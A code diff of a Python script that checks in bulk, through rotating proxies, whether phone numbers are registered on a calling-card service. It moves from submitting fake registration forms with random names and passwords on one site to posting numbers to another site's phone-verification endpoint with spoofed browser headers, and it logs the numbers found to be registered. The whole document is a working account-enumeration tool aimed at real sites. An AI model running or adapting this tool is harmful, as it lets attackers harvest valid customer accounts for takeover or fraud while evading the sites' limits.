@@ -1,8 +1,6 @@
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from sys import argv
 from os import path
-from string import digits, ascii_letters
-from random import randint
 from requests import post, packages
 from time import sleep
 
@@ -20,48 +18,40 @@ proxyLength = 0
 requestTimeout = 0
 sleepTime = 0
 poolThread = []
-finishedWriter = open('finished.txt', 'a+', buffering=1)
+finishedWriter = open('finished.txt', 'w+', buffering=1)
 validWriter = open('valid.txt', 'a+', buffering=1)
+respWriter = open('resp.txt', 'w+', buffering=1)
 proxyList = None
 
 
 def accountChecker(phoneNumber):
     global proxyCounter
-    postData = {'EcommProfileForm[dialing_code]': "1",
-                'EcommProfileForm[dialing_country_code]': 'US',
-                'EcommProfileForm[phone_number]': '(%s)+%s-%s' %
-                                                  (phoneNumber[:3], phoneNumber[3:6], phoneNumber[6:]),
-                'EcommProfileForm[first_name]': str(
-                    ''.join((ascii_letters + digits)[randint(0, 61)]
-                            for x in range(randint(7, 15)))),
-                'EcommProfileForm[last_name]': str(
-                    ''.join((ascii_letters + digits)[randint(0, 61)]
-                            for x in range(randint(7, 15)))),
-                'EcommProfileForm[username]': phoneNumber,
-                'EcommProfileForm[password]': str(
-                    ''.join((ascii_letters + digits)[randint(0, 61)]
-                            for x in range(randint(10, 40)))),
-                'EcommProfileForm[confirm_password]': None,
-                'EcommProfileForm[email]': str(
-                    ''.join((ascii_letters + digits)[randint(0, 61)]
-                            for x in range(randint(7, 15))) + ['@outlook.com',
-                                                               '@gmail.com',
-                                                               '@yahoo.com',
-                                                               '@yol.com'][
-                        randint(0, 3)]),
-                'EcommProfileForm[receipt]': '0',
-                'yt0': 'Continue'}
-    postData['EcommProfileForm[confirm_password]'] = postData['EcommProfileForm[password]']
+    headers = {
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'mystargold.com',
+        'Origin': 'https://mystargold.com',
+        'Referer': 'https://mystargold.com/register/index',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
+        'X-Requested-With': 'XMLHttpRequest'
+    }
+    postData = {'phoneNumber': phoneNumber}
+
     proxyCounter += 1
     proxyDict = {'http': proxyList[proxyCounter % proxyLength]}
     proxyDict['https'] = proxyDict['http']
 
     while True:
         try:
-            resp = post('https://dolexpinlesscalling.com/register/profile',
-                        data=postData, proxies=proxyDict, verify=False, timeout=requestTimeout)
+            resp = post('https://mystargold.com/register/verifyPhoneNumber',
+                        data=postData, proxies=proxyDict, verify=False, timeout=requestTimeout, headers=headers)
+            sleep(sleepTime)
             print('checked phoneNumber %s' % phoneNumber)
-            if 'usernametaken' in str(resp.content):
+            respWriter.write("---%s----\n%s\n" % (phoneNumber, resp.content))
+            if 'Phone # is already registered' in str(resp.content):
                 return True, phoneNumber
             return False, phoneNumber
         except Exception as e:
